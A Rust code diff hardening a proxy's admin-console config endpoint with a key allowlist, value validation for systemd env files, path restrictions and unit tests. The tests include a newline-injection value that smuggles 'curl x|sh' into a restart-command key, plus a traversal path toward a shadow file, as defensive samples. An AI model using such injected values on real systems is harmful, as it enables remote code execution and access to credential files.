@@ -22,6 +22,162 @@ const SECRET_MARKERS: &[&str] = &[
     "CLIENT_SECRET",
 ];
 
+/// Keys the Admin Console may change through `POST /api/config/apply`.
+///
+/// Strict allowlist of operational settings (the keys the console's
+/// `collectConfig` produces). Deliberately absent: anything that executes or
+/// loads code (`CONFIG_RESTART_CMD`, `WASM_*`, `LD_*`, `PATH`), relocates the
+/// config/ACL files (`CONFIG_ENV_PATH`, `ACL_RULES_PATH`), changes trust
+/// anchors or the deployment posture (`MITM_CA_DIR`, `UPSTREAM_CA_CERT`,
+/// `DEPLOYMENT_PROFILE`, `ALLOW_FULL_MITM`, `POLICY_MODE`, `BLOCK_*`,
+/// `CONTROL_API_*`) and every `*_TOKEN`. Also absent: destinations that would
+/// receive decrypted traffic, credentials or telemetry (ICAP, LDAP, OIDC
+/// issuer/secrets/redirects, Kafka, ClickHouse, Redis, webhooks, AI backends,
+/// hierarchy peers, threat feeds, RKN, reverse-proxy upstream), listener binds, and the eBPF arming switch. Those stay
+/// host-managed.
+pub const CONSOLE_EDITABLE_KEYS: &[&str] = &[
+    "HTTP_PORT",
+    "METRICS_PORT",
+    "RUST_LOG",
+    "SHUTDOWN_TIMEOUT_SECONDS",
+    "MAX_CACHE_BODY_SIZE",
+    "MITM_ENABLED",
+    "CACHE_CAPACITY",
+    "CACHE_TTL_SECONDS",
+    "CACHE_SHARDS",
+    "CACHE_HONOR_CACHE_CONTROL",
+    "NEGATIVE_CACHE_ENABLED",
+    "NEGATIVE_CACHE_TTL_SECONDS",
+    "CACHE_SPILL_THRESHOLD_BYTES",
+    "WORKER_COUNT",
+    "PERF_FAST_CACHE_HIT",
+    "STREAMING_MISS_ENABLED",
+    "KAFKA_SAMPLE_RATE",
+    "METRICS_SAMPLE_RATE",
+    "KAFKA_QUEUE_CAPACITY",
+    "KAFKA_TOPIC",
+    "KAFKA_ACKS",
+    "KAFKA_BATCH_SIZE",
+    "KAFKA_BATCH_TIMEOUT",
+    "AUTH_ENABLED",
+    "AUTH_BACKEND",
+    "AUTH_REALM",
+    "AUTH_CACHE_TTL",
+    "ACL_ENABLED",
+    "ACL_DEFAULT_ACTION",
+    "ACL_AUTO_RELOAD",
+    "ACL_RELOAD_INTERVAL",
+    "CATEGORIZATION_ENABLED",
+    "CATEGORIZATION_CACHE_TTL",
+    "UT1_ENABLED",
+    "UT1_PATH",
+    "URLHAUS_ENABLED",
+    "PHISHTANK_ENABLED",
+    "CUSTOM_DB_ENABLED",
+    "CUSTOM_DB_PATH",
+    "CLICKHOUSE_DATABASE",
+    "CLICKHOUSE_TABLE",
+    "PROMETHEUS_ENABLED",
+    "GRAFANA_ENABLED",
+    "ICAP_ENABLED",
+    "ICAP_FAIL_OPEN",
+    "ICAP_REQMOD",
+    "ICAP_RESPMOD",
+    "ALERT_WORKER_ENABLED",
+    "AI_CACHE_ENABLED",
+    "RKN_SYNC_ENABLED",
+    "DOH_ENABLED",
+    "DOT_ENABLED",
+    "LDAP_BASE_DN",
+    "LDAP_USER_FILTER",
+    "LDAP_USE_TLS",
+    "NTLM_DOMAIN",
+    "NTLM_WORKSTATION",
+    "REDIS_L2_ENABLED",
+    "REDIS_KEY_PREFIX",
+    "UPSTREAM_HTTP2_ENABLED",
+    "HTTP_PRESERVE_HEADER_CASE",
+    "THREAT_SCORE_ENABLED",
+    "THREAT_SCORE_POLL_INTERVAL_SECS",
+    "THREAT_SCORE_BLOCK_THRESHOLD",
+    "THREAT_SCORE_WARN_THRESHOLD",
+    "ICP_SERVER_ENABLED",
+    "HTCP_SERVER_ENABLED",
+    "PEER_DISCOVERY_ENABLED",
+    "RATE_LIMIT_ENABLED",
+    "RATE_LIMIT_MAX_KEYS",
+    "CONTROL_GRPC_ENABLED",
+    "OIDC_SESSION_TTL_SECONDS",
+    "OIDC_PROVIDERS",
+    "OIDC_GOOGLE_CLIENT_ID",
+    "OIDC_GOOGLE_ALLOWED_DOMAINS",
+    "OIDC_APPLE_CLIENT_ID",
+    "OIDC_APPLE_TEAM_ID",
+    "OIDC_APPLE_KEY_ID",
+    "OIDC_APPLE_PRIVATE_KEY_FILE",
+    "OIDC_CORP_CLIENT_ID",
+    "OIDC_CLIENT_ID",
+];
+
+/// Directories file-path settings may point into in production.
+const PRODUCTION_CONFIG_DIRS: &[&str] = &["/etc/bsdm-proxy/", "/var/lib/bsdm-proxy/"];
+
+fn is_path_key(key: &str) -> bool {
+    key.ends_with("_PATH") || key.ends_with("_FILE") || key.ends_with("_DIR")
+}
+
+/// Validate a console config delta before anything is written. Rejects the
+/// whole request (no partial apply) and names every offending key.
+pub fn validate_console_env(env: &HashMap<String, String>, production: bool) -> Result<(), String> {
+    let mut problems: Vec<String> = Vec::new();
+    let mut keys: Vec<&String> = env.keys().collect();
+    keys.sort();
+    for key in keys {
+        let value = &env[key];
+        let well_formed = !key.is_empty()
+            && key.bytes().next().is_some_and(|b| b.is_ascii_uppercase())
+            && key
+                .bytes()
+                .all(|b| b.is_ascii_uppercase() || b.is_ascii_digit() || b == b'_');
+        if !well_formed {
+            problems.push(format!("{key}: invalid key"));
+            continue;
+        }
+        if !CONSOLE_EDITABLE_KEYS.contains(&key.as_str()) {
+            problems.push(format!("{key}: not editable from the console"));
+            continue;
+        }
+        // A newline would inject extra KEY=VALUE lines into the env file.
+        if value.contains(['\r', '\n', '\0']) {
+            problems.push(format!("{key}: value contains a control character"));
+            continue;
+        }
+        // The file is read by systemd `EnvironmentFile`: a trailing `\` joins
+        // the next line (swallowing a host-managed key), and quotes change
+        // parsing. Values are written unquoted, so these are refused outright.
+        if value.contains(['\\', '"', '\'']) || value.trim() != value {
+            problems.push(format!(
+                "{key}: value must not contain backslashes, quotes or surrounding whitespace"
+            ));
+            continue;
+        }
+        if production && is_path_key(key) && !value.is_empty() {
+            let inside = PRODUCTION_CONFIG_DIRS.iter().any(|d| value.starts_with(d))
+                && !value.split('/').any(|c| c == "..");
+            if !inside {
+                problems.push(format!(
+                    "{key}: path must be under /etc/bsdm-proxy or /var/lib/bsdm-proxy"
+                ));
+            }
+        }
+    }
+    if problems.is_empty() {
+        Ok(())
+    } else {
+        Err(problems.join("; "))
+    }
+}
+
 #[derive(Debug, Clone, Deserialize)]
 pub struct ConfigApplyRequest {
     pub env: HashMap<String, String>,
@@ -193,7 +349,15 @@ fn snapshot_process_env() -> HashMap<String, String> {
     std::env::vars().collect()
 }
 
+/// Restart after a console apply.
+///
+/// `CONFIG_RESTART_CMD` is host-managed: the console cannot set it and the
+/// process environment is no longer mutated at runtime, so this is always the
+/// value the service was started with. In production without a restart
+/// command the process just shuts down and the supervisor (systemd/k8s)
+/// starts it again — self re-exec would be killed with the cgroup anyway.
 pub fn schedule_service_restart(shutdown_tx: watch::Sender<bool>) {
+    let production = crate::security_defaults::is_production_profile();
     tokio::spawn(async move {
         tokio::time::sleep(std::time::Duration::from_millis(750)).await;
 
@@ -212,6 +376,12 @@ pub fn schedule_service_restart(shutdown_tx: watch::Sender<bool>) {
                     Err(error) => warn!("CONFIG_RESTART_CMD failed: {error}"),
                 }
             }
+        }
+
+        if production {
+            info!("Config applied; shutting down for the service supervisor to restart");
+            let _ = shutdown_tx.send(true);
+            return;
         }
 
         if let Ok(exe) = std::env::current_exe() {
@@ -252,6 +422,100 @@ mod tests {
             "***".to_string()
         );
         assert_eq!(mask_secret_value("HTTP_PORT", "3128"), "3128".to_string());
+    }
+
+    fn env(pairs: &[(&str, &str)]) -> HashMap<String, String> {
+        pairs
+            .iter()
+            .map(|(k, v)| (k.to_string(), v.to_string()))
+            .collect()
+    }
+
+    #[test]
+    fn console_env_accepts_operational_keys() {
+        let ok = env(&[
+            ("HTTP_PORT", "3128"),
+            ("CACHE_TTL_SECONDS", "60"),
+            ("RUST_LOG", "info"),
+        ]);
+        assert!(validate_console_env(&ok, true).is_ok());
+    }
+
+    #[test]
+    fn console_env_rejects_dangerous_keys() {
+        for key in [
+            "CONFIG_RESTART_CMD",
+            "CONFIG_ENV_PATH",
+            "ACL_RULES_PATH",
+            "CONTROL_API_TOKEN",
+            "CONTROL_API_ALLOW_INSECURE",
+            "DEPLOYMENT_PROFILE",
+            "ALLOW_FULL_MITM",
+            "POLICY_MODE",
+            "MITM_CA_DIR",
+            "BLOCK_CLOUD_METADATA",
+            "LD_PRELOAD",
+            "PATH",
+            "WASM_MODULE_PATH",
+            "UPSTREAM_CA_CERT",
+            "ICAP_URL",
+            "LDAP_SERVERS",
+            "OIDC_ISSUER_URL",
+            "KAFKA_BROKERS",
+            "RKN_SYNC_URL",
+            "EBPF_XDP_ENABLED",
+            "DOH_BIND",
+            "REVERSE_PROXY_UPSTREAM",
+            "REDIS_URL",
+            "ALERT_WEBHOOK_URL",
+            "OLLAMA_URL",
+            "HIERARCHY_PEERS_PATH",
+            "OIDC_REDIRECT_URI",
+            "PHISHTANK_API_KEY",
+            "lower_case",
+            "BAD-KEY",
+        ] {
+            let err = validate_console_env(&env(&[(key, "x")]), false).unwrap_err();
+            assert!(err.contains(key), "{key}: {err}");
+        }
+    }
+
+    #[test]
+    fn console_env_rejects_newline_injection() {
+        let bad = env(&[("RUST_LOG", "info\nCONFIG_RESTART_CMD=curl x|sh")]);
+        assert!(validate_console_env(&bad, false).is_err());
+        assert!(validate_console_env(&env(&[("RUST_LOG", "a\rb")]), false).is_err());
+        assert!(validate_console_env(&env(&[("RUST_LOG", "a\0b")]), false).is_err());
+    }
+
+    #[test]
+    fn console_env_rejects_systemd_line_continuation_and_quotes() {
+        for value in ["http://x\\", "a\"b", "a'b", " lead", "trail "] {
+            let bad = env(&[("ICAP_FAIL_OPEN", value)]);
+            assert!(validate_console_env(&bad, false).is_err(), "{value:?}");
+        }
+        // Accepted values round-trip without touching neighbouring keys.
+        let ok = env(&[
+            ("URLHAUS_ENABLED", "true"),
+            ("RUST_LOG", "info,proxy=debug"),
+        ]);
+        assert!(validate_console_env(&ok, true).is_ok());
+        let mut file = ok.clone();
+        file.insert("CONTROL_API_TOKEN".into(), "secret".into());
+        let parsed = parse_env_text(&format_env_file(&file));
+        assert_eq!(parsed, file);
+    }
+
+    #[test]
+    fn console_env_restricts_paths_in_production() {
+        let outside = env(&[("UT1_PATH", "/tmp/evil")]);
+        assert!(CONSOLE_EDITABLE_KEYS.contains(&"UT1_PATH"));
+        assert!(validate_console_env(&outside, true).is_err());
+        assert!(validate_console_env(&outside, false).is_ok());
+        let traversal = env(&[("UT1_PATH", "/etc/bsdm-proxy/../shadow")]);
+        assert!(validate_console_env(&traversal, true).is_err());
+        let inside = env(&[("UT1_PATH", "/var/lib/bsdm-proxy/ut1")]);
+        assert!(validate_console_env(&inside, true).is_ok());
     }
 
     #[test]
